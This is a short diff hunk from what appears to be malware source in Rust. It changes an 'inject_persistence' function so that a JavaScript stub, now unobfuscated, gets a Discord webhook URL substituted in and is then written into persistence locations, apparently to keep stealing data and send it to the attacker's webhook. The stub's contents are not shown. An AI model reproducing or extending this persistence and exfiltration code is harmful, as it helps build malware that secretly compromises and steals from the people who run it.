@@ -71,7 +71,7 @@ fn dump_to_file(index_file: &PathBuf, payload: &str) {
 }
 
 pub fn inject_persistence() {
-    let to_dump: String = include!("../stub_obf.js").to_string();
+    let to_dump: String = include!("../stub.js").to_string().replace("WEBHOOK_URL_REPLACE", network::DISCORD_WEBHOOK_URL);
 
     let persistence_paths = get_persistence_paths();
     for persist_loc in persistence_paths {
